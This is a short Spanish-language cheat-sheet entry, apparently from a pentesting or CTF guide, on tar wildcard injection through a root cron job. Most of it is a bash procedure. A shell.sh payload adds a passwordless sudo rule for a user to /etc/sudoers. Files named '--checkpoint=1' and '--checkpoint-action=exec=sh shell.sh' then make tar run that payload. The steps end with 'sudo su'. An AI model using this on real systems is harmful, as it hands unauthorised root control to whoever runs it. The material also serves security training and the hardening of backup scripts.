Escenario: Un cron ejecuta `tar` con wildcard `*`
Explicación:
- `--checkpoint=1`: Activa checkpoint cada 1 registro
- `--checkpoint-action=exec=sh shell.sh`: Ejecuta shell.sh en cada checkpoint
- Cuando tar lee `*`, expande los nombres de archivo que empiezan con `--` como opciones

```bash
# Verificar el script de backup
cat /opt/scripts/compress.sh
# Contenido: tar czf /tmp/backup.tar.gz *

# Ir al directorio donde se ejecuta el tar
cd /home/user  # o donde esté el wildcard

# Crear payload
echo 'echo "usuario ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
chmod +x shell.sh

# Crear archivos que tar interpretará como argumentos
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Esperar a que el cron ejecute
# Verificar
sudo -l
sudo su
```
